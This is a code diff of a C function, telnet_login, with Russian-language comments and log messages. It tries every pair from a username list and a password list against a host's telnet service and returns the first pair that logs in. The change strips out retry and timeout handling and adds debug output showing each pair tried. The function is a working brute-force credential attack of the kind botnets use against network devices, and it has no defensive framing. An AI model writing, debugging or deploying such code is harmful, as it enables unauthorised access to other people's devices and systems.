@@ -8,66 +8,65 @@ Credentials telnet_login(const char *host) {
     char buffer[TELNET_MAX_BUFFER];
     int sock;
     struct sockaddr_in server;
-    int retry_count = 0;
-    const int max_retries = 3;
 
     printf("Пытаемся войти на %s...\n", host);
 
-    // Инициализация результата
-    memset(&result, 0, sizeof(Credentials));
-
     for (const char **username = usernames; *username != NULL; username++) {
         for (const char **password = passwords; *password != NULL; password++) {
-            retry_count = 0;
-            while (retry_count < max_retries) {
-                sock = create_socket(host, &server);
-                if (sock < 0) {
-                    printf("Не удалось установить соединение\n");
-                    sleep(1);
-                    retry_count++;
-                    continue;
-                }
-
-                // Установка таймаута для сокета
-                struct timeval timeout;
-                timeout.tv_sec = 5;  // 5 секунд таймаут
-                timeout.tv_usec = 0;
-                setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout));
-                setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout, sizeof(timeout));
-
-                if (!wait_for_prompt(sock)) {
-                    close(sock);
-                    retry_count++;
-                    sleep(1);
-                    continue;
-                }
-
-                send_username(sock, *username);
-                
-                if (!wait_for_prompt(sock)) {
-                    close(sock);
-                    retry_count++;
-                    sleep(1);
-                    continue;
-                }
-
-                send_password(sock, *password);
-
-                if (check_login_success(sock, buffer)) {
-                    strncpy(result.username, *username, sizeof(result.username) - 1);
-                    strncpy(result.password, *password, sizeof(result.password) - 1);
-                    result.good = 1;
-                    close(sock);
-                    return result;
-                }
-
-                close(sock);
-                break;  // Выход из цикла retry если логин неуспешен
+            sock = create_socket(host, &server);
+            if (sock < 0) {
+                printf("Не удалось установить соединение\n");
+                sleep(1);
+                continue;
             }
-            sleep(1);  // Задержка между попытками
+
+            printf("Соединение установлено\n");
+
+            // Ожидание приглашения для логина
+            if (!wait_for_prompt(sock)) {
+                printf("DEBUG: Не удалось получить приглашение для ввода логина\n");
+                close_socket(sock, "");
+                sleep(2);
+                continue;
+            }
+
+            printf("Пытаемся войти с логином %s\n", *username);
+            send_username(sock, *username);
+            sleep(1);
+
+            // Ожидание приглашения для пароля
+            if (!wait_for_prompt(sock)) {
+                printf("DEBUG: Не удалось получить приглашение для ввода пароля\n");
+                close_socket(sock, "");
+                sleep(2);
+                continue;
+            }
+
+            printf("Пытаемся войти с паролем %s\n", *password);
+            send_password(sock, *password);
+            sleep(2);
+
+            printf("Проверяем успешность входа\n");
+            if (check_login_success(sock, buffer)) {
+                strncpy(result.username, *username, sizeof(result.username) - 1);
+                strncpy(result.password, *password, sizeof(result.password) - 1);
+                result.username[sizeof(result.username) - 1] = '\0';
+                result.password[sizeof(result.password) - 1] = '\0';
+                result.good = 1;
+                close_socket(sock, "");
+                return result;
+            }
+
+            printf("DEBUG: Неудачная попытка входа с %s:%s\n", *username, *password);
+            close_socket(sock, "");
+            sleep(2); // Задержка между попытками
         }
     }
 
+    // Если вход не удался
+    result.username[0] = '\0';
+    result.password[0] = '\0';
+    result.good = 0;
     return result;
 }
 
